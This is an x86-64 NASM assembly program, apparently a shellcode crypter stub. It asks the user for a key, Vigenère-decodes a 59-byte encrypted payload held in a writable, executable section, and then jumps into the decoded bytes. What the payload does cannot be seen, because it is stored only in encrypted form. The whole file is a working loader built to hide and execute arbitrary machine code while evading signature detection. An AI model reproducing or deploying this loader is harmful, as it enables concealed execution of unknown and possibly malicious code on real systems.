; Build with: nasm -felf64 vigenere.nasm -o tmp.o && ld tmp.o -o vig_asm

global _start
section .TEXT exec write

_start:
; Prompt for key
mov ebx, 0x0a3f7965     ; Build a prompt string
shl rbx, 8
add rbx, 0x4b
push rbx
mov rsi, rsp            ; Get prompt string addr
push 5
pop rdx                 ; String length
push 1
pop rax
syscall                 ; sys_write

; Read response
push 64                 ; Max string size
pop rdx
add rsp, rdx            ; Make room on the stack
mov rsi, rsp            ; Pointer to stack space
xor rax, rax            ; Clear syscall id
push rax
pop rdi                 ; STDIN
syscall

dec rax                 ; String length minus newline

; Get the payload address
jmp _code_marker
 
_decode_start:
pop rdi                 ; Payload address
push 59                 ; Payload length
pop rcx
xor rdx, rdx            ; Offset value

; Vigenere decode
_decode:
mov bl, [rdi]           ; Get a byte from payload
sub bl, [rsi+rdx]       ; Subtract key value
mov [rdi], bl           ; Replace encoded value

; Move pointers
inc rdi                 ; Encoded data pointer
inc rdx                 ; Key offset value

; Check for loop in keystring
cmp al, dl              ; Compare to string length
jne _next
xor rdx, rdx            ; Reset if required

_next:
loop _decode

jmp _payload            ; Jump to decoded payload

_code_marker:
call _decode_start
_payload:
db 0xbc, 0xc2, 0xc7, 0xb7, 0x46, 0x8b, 0x0d, 0x74, 0xb9, 0xc8
db 0xb2, 0x7f, 0xc3, 0xa6, 0xb6, 0xa5, 0x8d, 0xdd, 0x3b, 0x4d
db 0x9f, 0x5e, 0xaf, 0x45, 0x9a, 0x6e, 0x4a, 0xac, 0x5e, 0x55
db 0xa3, 0x8d, 0xd9, 0xa2, 0x9f, 0xb3, 0xba, 0xd0, 0x3a, 0x54
db 0x35, 0x8b, 0x7b, 0x19, 0x9c, 0xe1, 0x83, 0x74, 0x62, 0x4a
db 0xad, 0x53, 0x9f, 0x9c, 0xe6, 0x9f, 0xaf, 0x62, 0x4a

_exit:
push 60
pop rax
syscall
